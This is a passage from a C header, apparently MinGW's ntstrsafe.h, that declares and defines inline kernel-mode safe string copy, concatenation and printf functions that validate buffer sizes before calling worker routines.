NTSTRSAFEDDI RtlStringCchCopyNExW(NTSTRSAFE_PWSTR pszDest,size_t cchDest,NTSTRSAFE_PCWSTR pszSrc,size_t cchToCopy,NTSTRSAFE_PWSTR *ppszDestEnd,size_t *pcchRemaining,unsigned __LONG32 dwFlags) {
  if(cchDest > NTSTRSAFE_MAX_CCH) return STATUS_INVALID_PARAMETER;
  return RtlStringCopyNExWorkerW(pszDest,cchDest,cchDest * sizeof(wchar_t),pszSrc,cchToCopy,ppszDestEnd,pcchRemaining,dwFlags);
}
#endif /* !__STRSAFE__NO_INLINE */

NTSTRSAFEDDI RtlStringCbCopyNExA(NTSTRSAFE_PSTR pszDest,size_t cbDest,NTSTRSAFE_PCSTR pszSrc,size_t cbToCopy,NTSTRSAFE_PSTR *ppszDestEnd,size_t *pcbRemaining,unsigned __LONG32 dwFlags);
NTSTRSAFEDDI RtlStringCbCopyNExW(NTSTRSAFE_PWSTR pszDest,size_t cbDest,NTSTRSAFE_PCWSTR pszSrc,size_t cbToCopy,NTSTRSAFE_PWSTR *ppszDestEnd,size_t *pcbRemaining,unsigned __LONG32 dwFlags);

#define RtlStringCbCopyNEx __MINGW_NAME_AW(RtlStringCbCopyNEx)

#ifndef __STRSAFE__NO_INLINE
NTSTRSAFEDDI RtlStringCbCopyNExA(NTSTRSAFE_PSTR pszDest,size_t cbDest,NTSTRSAFE_PCSTR pszSrc,size_t cbToCopy,NTSTRSAFE_PSTR *ppszDestEnd,size_t *pcbRemaining,unsigned __LONG32 dwFlags) {
  NTSTATUS hr;
  size_t cchRemaining = 0;
  if(cbDest > NTSTRSAFE_MAX_CCH)
    hr = STATUS_INVALID_PARAMETER;
  else
    hr = RtlStringCopyNExWorkerA(pszDest,cbDest,cbDest,pszSrc,cbToCopy,ppszDestEnd,&cchRemaining,dwFlags);
  if((NT_SUCCESS(hr) || hr == STATUS_BUFFER_OVERFLOW) && pcbRemaining)
    *pcbRemaining = cchRemaining;
  return hr;
}

NTSTRSAFEDDI RtlStringCbCopyNExW(NTSTRSAFE_PWSTR pszDest,size_t cbDest,NTSTRSAFE_PCWSTR pszSrc,size_t cbToCopy,NTSTRSAFE_PWSTR *ppszDestEnd,size_t *pcbRemaining,unsigned __LONG32 dwFlags) {
  NTSTATUS hr;
  size_t cchDest;
  size_t cchToCopy;
  size_t cchRemaining = 0;
  cchDest = cbDest / sizeof(wchar_t);
  cchToCopy = cbToCopy / sizeof(wchar_t);
  if(cchDest > NTSTRSAFE_MAX_CCH) hr = STATUS_INVALID_PARAMETER;
  else hr = RtlStringCopyNExWorkerW(pszDest,cchDest,cbDest,pszSrc,cchToCopy,ppszDestEnd,&cchRemaining,dwFlags);
  if((NT_SUCCESS(hr) || hr == STATUS_BUFFER_OVERFLOW) && pcbRemaining)
    *pcbRemaining = (cchRemaining*sizeof(wchar_t)) + (cbDest % sizeof(wchar_t));
  return hr;
}
#endif /* !__STRSAFE__NO_INLINE */

NTSTRSAFEDDI RtlStringCchCatA(NTSTRSAFE_PSTR pszDest,size_t cchDest,NTSTRSAFE_PCSTR pszSrc);
NTSTRSAFEDDI RtlStringCchCatW(NTSTRSAFE_PWSTR pszDest,size_t cchDest,NTSTRSAFE_PCWSTR pszSrc);

#define RtlStringCchCat __MINGW_NAME_AW(RtlStringCchCat)

#ifndef __STRSAFE__NO_INLINE
NTSTRSAFEDDI RtlStringCchCatA(NTSTRSAFE_PSTR pszDest,size_t cchDest,NTSTRSAFE_PCSTR pszSrc) {
  if(cchDest > NTSTRSAFE_MAX_CCH) return STATUS_INVALID_PARAMETER;
  return RtlStringCatWorkerA(pszDest,cchDest,pszSrc);
}

NTSTRSAFEDDI RtlStringCchCatW(NTSTRSAFE_PWSTR pszDest,size_t cchDest,NTSTRSAFE_PCWSTR pszSrc) {
  if(cchDest > NTSTRSAFE_MAX_CCH) return STATUS_INVALID_PARAMETER;
  return RtlStringCatWorkerW(pszDest,cchDest,pszSrc);
}
#endif /* !__STRSAFE__NO_INLINE */

NTSTRSAFEDDI RtlStringCbCatA(NTSTRSAFE_PSTR pszDest,size_t cbDest,NTSTRSAFE_PCSTR pszSrc);
NTSTRSAFEDDI RtlStringCbCatW(NTSTRSAFE_PWSTR pszDest,size_t cbDest,NTSTRSAFE_PCWSTR pszSrc);

#define RtlStringCbCat __MINGW_NAME_AW(RtlStringCbCat)

#ifndef __STRSAFE__NO_INLINE
NTSTRSAFEDDI RtlStringCbCatA(NTSTRSAFE_PSTR pszDest,size_t cbDest,NTSTRSAFE_PCSTR pszSrc) {
  if(cbDest > NTSTRSAFE_MAX_CCH) return STATUS_INVALID_PARAMETER;
  return RtlStringCatWorkerA(pszDest,cbDest,pszSrc);
}

NTSTRSAFEDDI RtlStringCbCatW(NTSTRSAFE_PWSTR pszDest,size_t cbDest,NTSTRSAFE_PCWSTR pszSrc) {
  size_t cchDest = cbDest / sizeof(wchar_t);
  if(cchDest > NTSTRSAFE_MAX_CCH) return STATUS_INVALID_PARAMETER;
  return RtlStringCatWorkerW(pszDest,cchDest,pszSrc);
}
#endif /* !__STRSAFE__NO_INLINE */

NTSTRSAFEDDI RtlStringCchCatExA(NTSTRSAFE_PSTR pszDest,size_t cchDest,NTSTRSAFE_PCSTR pszSrc,NTSTRSAFE_PSTR *ppszDestEnd,size_t *pcchRemaining,unsigned __LONG32 dwFlags);
NTSTRSAFEDDI RtlStringCchCatExW(NTSTRSAFE_PWSTR pszDest,size_t cchDest,NTSTRSAFE_PCWSTR pszSrc,NTSTRSAFE_PWSTR *ppszDestEnd,size_t *pcchRemaining,unsigned __LONG32 dwFlags);

#define RtlStringCchCatEx __MINGW_NAME_AW(RtlStringCchCatEx)

#ifndef __STRSAFE__NO_INLINE
NTSTRSAFEDDI RtlStringCchCatExA(NTSTRSAFE_PSTR pszDest,size_t cchDest,NTSTRSAFE_PCSTR pszSrc,NTSTRSAFE_PSTR *ppszDestEnd,size_t *pcchRemaining,unsigned __LONG32 dwFlags) {
  if(cchDest > NTSTRSAFE_MAX_CCH) return STATUS_INVALID_PARAMETER;
  return RtlStringCatExWorkerA(pszDest,cchDest,cchDest,pszSrc,ppszDestEnd,pcchRemaining,dwFlags);
}

NTSTRSAFEDDI RtlStringCchCatExW(NTSTRSAFE_PWSTR pszDest,size_t cchDest,NTSTRSAFE_PCWSTR pszSrc,NTSTRSAFE_PWSTR *ppszDestEnd,size_t *pcchRemaining,unsigned __LONG32 dwFlags) {
  size_t cbDest = cchDest*sizeof(wchar_t);
  if(cchDest > NTSTRSAFE_MAX_CCH) return STATUS_INVALID_PARAMETER;
  return RtlStringCatExWorkerW(pszDest,cchDest,cbDest,pszSrc,ppszDestEnd,pcchRemaining,dwFlags);
}
#endif /* !__STRSAFE__NO_INLINE */

NTSTRSAFEDDI RtlStringCbCatExA(NTSTRSAFE_PSTR pszDest,size_t cbDest,NTSTRSAFE_PCSTR pszSrc,NTSTRSAFE_PSTR *ppszDestEnd,size_t *pcbRemaining,unsigned __LONG32 dwFlags);
NTSTRSAFEDDI RtlStringCbCatExW(NTSTRSAFE_PWSTR pszDest,size_t cbDest,NTSTRSAFE_PCWSTR pszSrc,NTSTRSAFE_PWSTR *ppszDestEnd,size_t *pcbRemaining,unsigned __LONG32 dwFlags);

#define RtlStringCbCatEx __MINGW_NAME_AW(RtlStringCbCatEx)

#ifndef __STRSAFE__NO_INLINE
NTSTRSAFEDDI RtlStringCbCatExA(NTSTRSAFE_PSTR pszDest,size_t cbDest,NTSTRSAFE_PCSTR pszSrc,NTSTRSAFE_PSTR *ppszDestEnd,size_t *pcbRemaining,unsigned __LONG32 dwFlags) {
  NTSTATUS hr;
  size_t cchRemaining = 0;
  if(cbDest > NTSTRSAFE_MAX_CCH) hr = STATUS_INVALID_PARAMETER;
  else hr = RtlStringCatExWorkerA(pszDest,cbDest,cbDest,pszSrc,ppszDestEnd,&cchRemaining,dwFlags);
  if((NT_SUCCESS(hr) || hr == STATUS_BUFFER_OVERFLOW) && pcbRemaining)
    *pcbRemaining = (cchRemaining*sizeof(char)) + (cbDest % sizeof(char));
  return hr;
}

NTSTRSAFEDDI RtlStringCbCatExW(NTSTRSAFE_PWSTR pszDest,size_t cbDest,NTSTRSAFE_PCWSTR pszSrc,NTSTRSAFE_PWSTR *ppszDestEnd,size_t *pcbRemaining,unsigned __LONG32 dwFlags) {
  NTSTATUS hr;
  size_t cchDest = cbDest / sizeof(wchar_t);
  size_t cchRemaining = 0;

  if(cchDest > NTSTRSAFE_MAX_CCH) hr = STATUS_INVALID_PARAMETER;
  else hr = RtlStringCatExWorkerW(pszDest,cchDest,cbDest,pszSrc,ppszDestEnd,&cchRemaining,dwFlags);
  if((NT_SUCCESS(hr) || hr == STATUS_BUFFER_OVERFLOW) && pcbRemaining)
    *pcbRemaining = (cchRemaining*sizeof(wchar_t)) + (cbDest % sizeof(wchar_t));
  return hr;
}
#endif /* !__STRSAFE__NO_INLINE */

NTSTRSAFEDDI RtlStringCchCatNA(NTSTRSAFE_PSTR pszDest,size_t cchDest,NTSTRSAFE_PCSTR pszSrc,size_t cchToAppend);
NTSTRSAFEDDI RtlStringCchCatNW(NTSTRSAFE_PWSTR pszDest,size_t cchDest,NTSTRSAFE_PCWSTR pszSrc,size_t cchToAppend);

#define RtlStringCchCatN __MINGW_NAME_AW(RtlStringCchCatN)

#ifndef __STRSAFE__NO_INLINE
NTSTRSAFEDDI RtlStringCchCatNA(NTSTRSAFE_PSTR pszDest,size_t cchDest,NTSTRSAFE_PCSTR pszSrc,size_t cchToAppend) {
  if(cchDest > NTSTRSAFE_MAX_CCH) return STATUS_INVALID_PARAMETER;
  return RtlStringCatNWorkerA(pszDest,cchDest,pszSrc,cchToAppend);
}

NTSTRSAFEDDI RtlStringCchCatNW(NTSTRSAFE_PWSTR pszDest,size_t cchDest,NTSTRSAFE_PCWSTR pszSrc,size_t cchToAppend) {
  if(cchDest > NTSTRSAFE_MAX_CCH) return STATUS_INVALID_PARAMETER;
  return RtlStringCatNWorkerW(pszDest,cchDest,pszSrc,cchToAppend);
}
#endif /* !__STRSAFE__NO_INLINE */

NTSTRSAFEDDI RtlStringCbCatNA(NTSTRSAFE_PSTR pszDest,size_t cbDest,NTSTRSAFE_PCSTR pszSrc,size_t cbToAppend);
NTSTRSAFEDDI RtlStringCbCatNW(NTSTRSAFE_PWSTR pszDest,size_t cbDest,NTSTRSAFE_PCWSTR pszSrc,size_t cbToAppend);

#define RtlStringCbCatN __MINGW_NAME_AW(RtlStringCbCatN)

#ifndef __STRSAFE__NO_INLINE
NTSTRSAFEDDI RtlStringCbCatNA(NTSTRSAFE_PSTR pszDest,size_t cbDest,NTSTRSAFE_PCSTR pszSrc,size_t cbToAppend) {
  if(cbDest > NTSTRSAFE_MAX_CCH) return STATUS_INVALID_PARAMETER;
  return RtlStringCatNWorkerA(pszDest,cbDest,pszSrc,cbToAppend);
}

NTSTRSAFEDDI RtlStringCbCatNW(NTSTRSAFE_PWSTR pszDest,size_t cbDest,NTSTRSAFE_PCWSTR pszSrc,size_t cbToAppend) {
  size_t cchDest = cbDest / sizeof(wchar_t);
  size_t cchToAppend = cbToAppend / sizeof(wchar_t);

  if(cchDest > NTSTRSAFE_MAX_CCH) return STATUS_INVALID_PARAMETER;
  return RtlStringCatNWorkerW(pszDest,cchDest,pszSrc,cchToAppend);
}
#endif /* !__STRSAFE__NO_INLINE */

NTSTRSAFEDDI RtlStringCchCatNExA(NTSTRSAFE_PSTR pszDest,size_t cchDest,NTSTRSAFE_PCSTR pszSrc,size_t cchToAppend,NTSTRSAFE_PSTR *ppszDestEnd,size_t *pcchRemaining,unsigned __LONG32 dwFlags);
NTSTRSAFEDDI RtlStringCchCatNExW(NTSTRSAFE_PWSTR pszDest,size_t cchDest,NTSTRSAFE_PCWSTR pszSrc,size_t cchToAppend,NTSTRSAFE_PWSTR *ppszDestEnd,size_t *pcchRemaining,unsigned __LONG32 dwFlags);

#define RtlStringCchCatNEx __MINGW_NAME_AW(RtlStringCchCatNEx)

#ifndef __STRSAFE__NO_INLINE
NTSTRSAFEDDI RtlStringCchCatNExA(NTSTRSAFE_PSTR pszDest,size_t cchDest,NTSTRSAFE_PCSTR pszSrc,size_t cchToAppend,NTSTRSAFE_PSTR *ppszDestEnd,size_t *pcchRemaining,unsigned __LONG32 dwFlags) {
  if(cchDest > NTSTRSAFE_MAX_CCH) return STATUS_INVALID_PARAMETER;
  return RtlStringCatNExWorkerA(pszDest,cchDest,cchDest,pszSrc,cchToAppend,ppszDestEnd,pcchRemaining,dwFlags);
}

NTSTRSAFEDDI RtlStringCchCatNExW(NTSTRSAFE_PWSTR pszDest,size_t cchDest,NTSTRSAFE_PCWSTR pszSrc,size_t cchToAppend,NTSTRSAFE_PWSTR *ppszDestEnd,size_t *pcchRemaining,unsigned __LONG32 dwFlags) {
  if(cchDest > NTSTRSAFE_MAX_CCH) return STATUS_INVALID_PARAMETER;
  return RtlStringCatNExWorkerW(pszDest,cchDest,(cchDest*sizeof(wchar_t)),pszSrc,cchToAppend,ppszDestEnd,pcchRemaining,dwFlags);
}
#endif

NTSTRSAFEDDI RtlStringCbCatNExA(NTSTRSAFE_PSTR pszDest,size_t cbDest,NTSTRSAFE_PCSTR pszSrc,size_t cbToAppend,NTSTRSAFE_PSTR *ppszDestEnd,size_t *pcbRemaining,unsigned __LONG32 dwFlags);
NTSTRSAFEDDI RtlStringCbCatNExW(NTSTRSAFE_PWSTR pszDest,size_t cbDest,NTSTRSAFE_PCWSTR pszSrc,size_t cbToAppend,NTSTRSAFE_PWSTR *ppszDestEnd,size_t *pcbRemaining,unsigned __LONG32 dwFlags);

#define RtlStringCbCatNEx __MINGW_NAME_AW(RtlStringCbCatNEx)

#ifndef __STRSAFE__NO_INLINE
NTSTRSAFEDDI RtlStringCbCatNExA(NTSTRSAFE_PSTR pszDest,size_t cbDest,NTSTRSAFE_PCSTR pszSrc,size_t cbToAppend,NTSTRSAFE_PSTR *ppszDestEnd,size_t *pcbRemaining,unsigned __LONG32 dwFlags) {
  NTSTATUS hr;
  size_t cchRemaining = 0;
  if(cbDest > NTSTRSAFE_MAX_CCH) hr = STATUS_INVALID_PARAMETER;
  else hr = RtlStringCatNExWorkerA(pszDest,cbDest,cbDest,pszSrc,cbToAppend,ppszDestEnd,&cchRemaining,dwFlags);
  if((NT_SUCCESS(hr) || hr == STATUS_BUFFER_OVERFLOW) && pcbRemaining)
    *pcbRemaining = (cchRemaining*sizeof(char)) + (cbDest % sizeof(char));
  return hr;
}

NTSTRSAFEDDI RtlStringCbCatNExW(NTSTRSAFE_PWSTR pszDest,size_t cbDest,NTSTRSAFE_PCWSTR pszSrc,size_t cbToAppend,NTSTRSAFE_PWSTR *ppszDestEnd,size_t *pcbRemaining,unsigned __LONG32 dwFlags) {
  NTSTATUS hr;
  size_t cchDest = cbDest / sizeof(wchar_t);
  size_t cchToAppend = cbToAppend / sizeof(wchar_t);
  size_t cchRemaining = 0;
  if(cchDest > NTSTRSAFE_MAX_CCH) hr = STATUS_INVALID_PARAMETER;
  else hr = RtlStringCatNExWorkerW(pszDest,cchDest,cbDest,pszSrc,cchToAppend,ppszDestEnd,&cchRemaining,dwFlags);
  if((NT_SUCCESS(hr) || hr == STATUS_BUFFER_OVERFLOW) && pcbRemaining)
    *pcbRemaining = (cchRemaining*sizeof(wchar_t)) + (cbDest % sizeof(wchar_t));
  return hr;
}
#endif /* !__STRSAFE__NO_INLINE */

NTSTRSAFEDDI RtlStringCchVPrintfA(NTSTRSAFE_PSTR pszDest,size_t cchDest,NTSTRSAFE_PCSTR pszFormat,va_list argList);
NTSTRSAFEDDI RtlStringCchVPrintfW(NTSTRSAFE_PWSTR pszDest,size_t cchDest,NTSTRSAFE_PCWSTR pszFormat,va_list argList);

#define RtlStringCchVPrintf __MINGW_NAME_AW(RtlStringCchVPrintf)

#ifndef __STRSAFE__NO_INLINE
NTSTRSAFEDDI RtlStringCchVPrintfA(NTSTRSAFE_PSTR pszDest,size_t cchDest,NTSTRSAFE_PCSTR pszFormat,va_list argList) {
  if(cchDest > NTSTRSAFE_MAX_CCH) return STATUS_INVALID_PARAMETER;
  return RtlStringVPrintfWorkerA(pszDest,cchDest,pszFormat,argList);
}

NTSTRSAFEDDI RtlStringCchVPrintfW(NTSTRSAFE_PWSTR pszDest,size_t cchDest,NTSTRSAFE_PCWSTR pszFormat,va_list argList) {
  if(cchDest > NTSTRSAFE_MAX_CCH) return STATUS_INVALID_PARAMETER;
  return RtlStringVPrintfWorkerW(pszDest,cchDest,pszFormat,argList);
}
#endif /* !__STRSAFE__NO_INLINE */

NTSTRSAFEDDI RtlStringCbVPrintfA(NTSTRSAFE_PSTR pszDest,size_t cbDest,NTSTRSAFE_PCSTR pszFormat,va_list argList);
NTSTRSAFEDDI RtlStringCbVPrintfW(NTSTRSAFE_PWSTR pszDest,size_t cbDest,NTSTRSAFE_PCWSTR pszFormat,va_list argList);

#define RtlStringCbVPrintf __MINGW_NAME_AW(RtlStringCbVPrintf)

#ifndef __STRSAFE__NO_INLINE
NTSTRSAFEDDI RtlStringCbVPrintfA(NTSTRSAFE_PSTR pszDest,size_t cbDest,NTSTRSAFE_PCSTR pszFormat,va_list argList) {
  if(cbDest > NTSTRSAFE_MAX_CCH) return STATUS_INVALID_PARAMETER;
  return RtlStringVPrintfWorkerA(pszDest,cbDest,pszFormat,argList);
}

NTSTRSAFEDDI RtlStringCbVPrintfW(NTSTRSAFE_PWSTR pszDest,size_t cbDest,NTSTRSAFE_PCWSTR pszFormat,va_list argList) {
  size_t cchDest = cbDest / sizeof(wchar_t);
  if(cchDest > NTSTRSAFE_MAX_CCH) return STATUS_INVALID_PARAMETER;
  return RtlStringVPrintfWorkerW(pszDest,cchDest,pszFormat,argList);
}
#endif /* !__STRSAFE__NO_INLINE */

NTSTRSAFEDDIV RtlStringCchPrintfA(NTSTRSAFE_PSTR pszDest,size_t cchDest,NTSTRSAFE_PCSTR pszFormat,...);
NTSTRSAFEDDIV RtlStringCchPrintfW(NTSTRSAFE_PWSTR pszDest,size_t cchDest,NTSTRSAFE_PCWSTR pszFormat,...);

#define RtlStringCchPrintf __MINGW_NAME_AW(RtlStringCchPrintf)

#ifndef __STRSAFE__NO_INLINE
NTSTRSAFEDDIV RtlStringCchPrintfA(NTSTRSAFE_PSTR pszDest,size_t cchDest,NTSTRSAFE_PCSTR pszFormat,...) {
  NTSTATUS hr;
  va_list argList;
  if(cchDest > NTSTRSAFE_MAX_CCH) return STATUS_INVALID_PARAMETER;
  va_start(argList,pszFormat);
  hr = RtlStringVPrintfWorkerA(pszDest,cchDest,pszFormat,argList);
  va_end(argList);
  return hr;
}

NTSTRSAFEDDIV RtlStringCchPrintfW(NTSTRSAFE_PWSTR pszDest,size_t cchDest,NTSTRSAFE_PCWSTR pszFormat,...) {
  NTSTATUS hr;
  va_list argList;
  if(cchDest > NTSTRSAFE_MAX_CCH) return STATUS_INVALID_PARAMETER;
  va_start(argList,pszFormat);
  hr = RtlStringVPrintfWorkerW(pszDest,cchDest,pszFormat,argList);
  va_end(argList);
  return hr;
}
#endif /* !__STRSAFE__NO_INLINE */

NTSTRSAFEDDIV RtlStringCbPrintfA(NTSTRSAFE_PSTR pszDest,size_t cbDest,NTSTRSAFE_PCSTR pszFormat,...);
NTSTRSAFEDDIV RtlStringCbPrintfW(NTSTRSAFE_PWSTR pszDest,size_t cbDest,NTSTRSAFE_PCWSTR pszFormat,...);

#define RtlStringCbPrintf __MINGW_NAME_AW(RtlStringCbPrintf)

#ifndef __STRSAFE__NO_INLINE
NTSTRSAFEDDIV RtlStringCbPrintfA(NTSTRSAFE_PSTR pszDest,size_t cbDest,NTSTRSAFE_PCSTR pszFormat,...) {
  NTSTATUS hr;
  va_list argList;
  if(cbDest > NTSTRSAFE_MAX_CCH) return STATUS_INVALID_PARAMETER;
  va_start(argList,pszFormat);
  hr = RtlStringVPrintfWorkerA(pszDest,cbDest,pszFormat,argList);
  va_end(argList);
  return hr;
}

NTSTRSAFEDDIV RtlStringCbPrintfW(NTSTRSAFE_PWSTR pszDest,size_t cbDest,NTSTRSAFE_PCWSTR pszFormat,...) {
  NTSTATUS hr;
  va_list argList;
  size_t cchDest = cbDest / sizeof(wchar_t);
  if(cchDest > NTSTRSAFE_MAX_CCH) return STATUS_INVALID_PARAMETER;
  va_start(argList,pszFormat);
  hr = RtlStringVPrintfWorkerW(pszDest,cchDest,pszFormat,argList);
  va_end(argList);
  return hr;
}
#endif /* !__STRSAFE__NO_INLINE */

NTSTRSAFEDDIV RtlStringCchPrintfExA(NTSTRSAFE_PSTR pszDest,size_t cchDest,NTSTRSAFE_PSTR *ppszDestEnd,size_t *pcchRemaining,unsigned __LONG32 dwFlags,NTSTRSAFE_PCSTR pszFormat,...);
NTSTRSAFEDDIV RtlStringCchPrintfExW(NTSTRSAFE_PWSTR pszDest,size_t cchDest,NTSTRSAFE_PWSTR *ppszDestEnd,size_t *pcchRemaining,unsigned __LONG32 dwFlags,NTSTRSAFE_PCWSTR pszFormat,...);

#define RtlStringCchPrintfEx __MINGW_NAME_AW(RtlStringCchPrintfEx)

#ifndef __STRSAFE__NO_INLINE
NTSTRSAFEDDIV RtlStringCchPrintfExA(NTSTRSAFE_PSTR pszDest,size_t cchDest,NTSTRSAFE_PSTR *ppszDestEnd,size_t *pcchRemaining,unsigned __LONG32 dwFlags,NTSTRSAFE_PCSTR pszFormat,...) {
  NTSTATUS hr;
  va_list argList;
  if(cchDest > NTSTRSAFE_MAX_CCH) return STATUS_INVALID_PARAMETER;
  va_start(argList,pszFormat);
  hr = RtlStringVPrintfExWorkerA(pszDest,cchDest,cchDest,ppszDestEnd,pcchRemaining,dwFlags,pszFormat,argList);
  va_end(argList);
  return hr;
}

NTSTRSAFEDDIV RtlStringCchPrintfExW(NTSTRSAFE_PWSTR pszDest,size_t cchDest,NTSTRSAFE_PWSTR *ppszDestEnd,size_t *pcchRemaining,unsigned __LONG32 dwFlags,NTSTRSAFE_PCWSTR pszFormat,...) {
  NTSTATUS hr;
  size_t cbDest = cchDest * sizeof(wchar_t);
  va_list argList;
  if(cchDest > NTSTRSAFE_MAX_CCH) return STATUS_INVALID_PARAMETER;
  va_start(argList,pszFormat);
  hr = RtlStringVPrintfExWorkerW(pszDest,cchDest,cbDest,ppszDestEnd,pcchRemaining,dwFlags,pszFormat,argList);
  va_end(argList);
  return hr;
}
#endif /* !__STRSAFE__NO_INLINE */

NTSTRSAFEDDIV RtlStringCbPrintfExA(NTSTRSAFE_PSTR pszDest,size_t cbDest,NTSTRSAFE_PSTR *ppszDestEnd,size_t *pcbRemaining,unsigned __LONG32 dwFlags,NTSTRSAFE_PCSTR pszFormat,...);
NTSTRSAFEDDIV RtlStringCbPrintfExW(NTSTRSAFE_PWSTR pszDest,size_t cbDest,NTSTRSAFE_PWSTR *ppszDestEnd,size_t *pcbRemaining,unsigned __LONG32 dwFlags,NTSTRSAFE_PCWSTR pszFormat,...);

#define RtlStringCbPrintfEx __MINGW_NAME_AW(RtlStringCbPrintfEx)

#ifndef __STRSAFE__NO_INLINE
NTSTRSAFEDDIV RtlStringCbPrintfExA(NTSTRSAFE_PSTR pszDest,size_t cbDest,NTSTRSAFE_PSTR *ppszDestEnd,size_t *pcbRemaining,unsigned __LONG32 dwFlags,NTSTRSAFE_PCSTR pszFormat,...) {
  NTSTATUS hr;
  size_t cchDest;
  size_t cchRemaining = 0;
  cchDest = cbDest / sizeof(char);
  if(cchDest > NTSTRSAFE_MAX_CCH) hr = STATUS_INVALID_PARAMETER;
  else {
    va_list argList;
    va_start(argList,pszFormat);
    hr = RtlStringVPrintfExWorkerA(pszDest,cchDest,cbDest,ppszDestEnd,&cchRemaining,dwFlags,pszFormat,argList);
    va_end(argList);
  }
  if(NT_SUCCESS(hr) || (hr==STATUS_BUFFER_OVERFLOW)) {
    if(pcbRemaining) {
      *pcbRemaining = (cchRemaining*sizeof(char)) + (cbDest % sizeof(char));
    }
  }
  return hr;
}

NTSTRSAFEDDIV RtlStringCbPrintfExW(NTSTRSAFE_PWSTR pszDest,size_t cbDest,NTSTRSAFE_PWSTR *ppszDestEnd,size_t *pcbRemaining,unsigned __LONG32 dwFlags,NTSTRSAFE_PCWSTR pszFormat,...) {
  NTSTATUS hr;
  size_t cchDest;
  size_t cchRemaining = 0;
  cchDest = cbDest / sizeof(wchar_t);
  if(cchDest > NTSTRSAFE_MAX_CCH) hr = STATUS_INVALID_PARAMETER;
  else {
    va_list argList;
    va_start(argList,pszFormat);
    hr = RtlStringVPrintfExWorkerW(pszDest,cchDest,cbDest,ppszDestEnd,&cchRemaining,dwFlags,pszFormat,argList);
    va_end(argList);
  }
  if(NT_SUCCESS(hr) || (hr==STATUS_BUFFER_OVERFLOW)) {
    if(pcbRemaining) {
      *pcbRemaining = (cchRemaining*sizeof(wchar_t)) + (cbDest % sizeof(wchar_t));
    }
  }
  return hr;
}
#endif /* !__STRSAFE__NO_INLINE */

NTSTRSAFEDDI RtlStringCchVPrintfExA(NTSTRSAFE_PSTR pszDest,size_t cchDest,NTSTRSAFE_PSTR *ppszDestEnd,size_t *pcchRemaining,unsigned __LONG32 dwFlags,NTSTRSAFE_PCSTR pszFormat,va_list argList);
NTSTRSAFEDDI RtlStringCchVPrintfExW(NTSTRSAFE_PWSTR pszDest,size_t cchDest,NTSTRSAFE_PWSTR *ppszDestEnd,size_t *pcchRemaining,unsigned __LONG32 dwFlags,NTSTRSAFE_PCWSTR pszFormat,va_list argList);

#define RtlStringCchVPrintfEx __MINGW_NAME_AW(RtlStringCchVPrintfEx)

#ifndef __STRSAFE__NO_INLINE
NTSTRSAFEDDI RtlStringCchVPrintfExA(NTSTRSAFE_PSTR pszDest,size_t cchDest,NTSTRSAFE_PSTR *ppszDestEnd,size_t *pcchRemaining,unsigned __LONG32 dwFlags,NTSTRSAFE_PCSTR pszFormat,va_list argList) {
  NTSTATUS hr;
  if(cchDest > NTSTRSAFE_MAX_CCH) hr = STATUS_INVALID_PARAMETER;
  else {
    size_t cbDest;
    cbDest = cchDest*sizeof(char);
    hr = RtlStringVPrintfExWorkerA(pszDest,cchDest,cbDest,ppszDestEnd,pcchRemaining,dwFlags,pszFormat,argList);
  }
  return hr;
}

NTSTRSAFEDDI RtlStringCchVPrintfExW(NTSTRSAFE_PWSTR pszDest,size_t cchDest,NTSTRSAFE_PWSTR *ppszDestEnd,size_t *pcchRemaining,unsigned __LONG32 dwFlags,NTSTRSAFE_PCWSTR pszFormat,va_list argList) {
  NTSTATUS hr;
  if(cchDest > NTSTRSAFE_MAX_CCH) hr = STATUS_INVALID_PARAMETER;
  else {
    size_t cbDest;
    cbDest = cchDest*sizeof(wchar_t);
    hr = RtlStringVPrintfExWorkerW(pszDest,cchDest,cbDest,ppszDestEnd,pcchRemaining,dwFlags,pszFormat,argList);
  }
  return hr;
}
#endif /* !__STRSAFE__NO_INLINE */

NTSTRSAFEDDI RtlStringCbVPrintfExA(NTSTRSAFE_PSTR pszDest,size_t cbDest,NTSTRSAFE_PSTR *ppszDestEnd,size_t *pcbRemaining,unsigned __LONG32 dwFlags,NTSTRSAFE_PCSTR pszFormat,va_list argList);
NTSTRSAFEDDI RtlStringCbVPrintfExW(NTSTRSAFE_PWSTR pszDest,size_t cbDest,NTSTRSAFE_PWSTR *ppszDestEnd,size_t *pcbRemaining,unsigned __LONG32 dwFlags,NTSTRSAFE_PCWSTR pszFormat,va_list argList);

#define RtlStringCbVPrintfEx __MINGW_NAME_AW(RtlStringCbVPrintfEx)

#ifndef __STRSAFE__NO_INLINE
NTSTRSAFEDDI RtlStringCbVPrintfExA(NTSTRSAFE_PSTR pszDest,size_t cbDest,NTSTRSAFE_PSTR *ppszDestEnd,size_t *pcbRemaining,unsigned __LONG32 dwFlags,NTSTRSAFE_PCSTR pszFormat,va_list argList) {
  NTSTATUS hr;
  size_t cchDest;
  size_t cchRemaining = 0;
  cchDest = cbDest / sizeof(char);
  if(cchDest > NTSTRSAFE_MAX_CCH) hr = STATUS_INVALID_PARAMETER;
  else hr = RtlStringVPrintfExWorkerA(pszDest,cchDest,cbDest,ppszDestEnd,&cchRemaining,dwFlags,pszFormat,argList);
  if(NT_SUCCESS(hr) || (hr==STATUS_BUFFER_OVERFLOW)) {
    if(pcbRemaining) {
      *pcbRemaining = (cchRemaining*sizeof(char)) + (cbDest % sizeof(char));
    }
  }
  return hr;
}

NTSTRSAFEDDI RtlStringCbVPrintfExW(NTSTRSAFE_PWSTR pszDest,size_t cbDest,NTSTRSAFE_PWSTR *ppszDestEnd,size_t *pcbRemaining,unsigned __LONG32 dwFlags,NTSTRSAFE_PCWSTR pszFormat,va_list argList) {
  NTSTATUS hr;
  size_t cchDest;
  size_t cchRemaining = 0;
  cchDest = cbDest / sizeof(wchar_t);
  if(cchDest > NTSTRSAFE_MAX_CCH) hr = STATUS_INVALID_PARAMETER;
  else hr = RtlStringVPrintfExWorkerW(pszDest,cchDest,cbDest,ppszDestEnd,&cchRemaining,dwFlags,pszFormat,argList);
  if(NT_SUCCESS(hr) || (hr==STATUS_BUFFER_OVERFLOW)) {
    if(pcbRemaining) {
      *pcbRemaining = (cchRemaining*sizeof(wchar_t)) + (cbDest % sizeof(wchar_t));
    }
  }
  return hr;
}
#endif /* !__STRSAFE__NO_INLINE */

NTSTRSAFEDDI RtlStringCchLengthA(NTSTRSAFE_PCSTR psz,size_t cchMax,size_t *pcchLength);
NTSTRSAFEDDI RtlStringCchLengthW(NTSTRSAFE_PCWSTR psz,size_t cchMax,size_t *pcchLength);

#define RtlStringCchLength __MINGW_NAME_AW(RtlStringCchLength)

#ifndef __STRSAFE__NO_INLINE
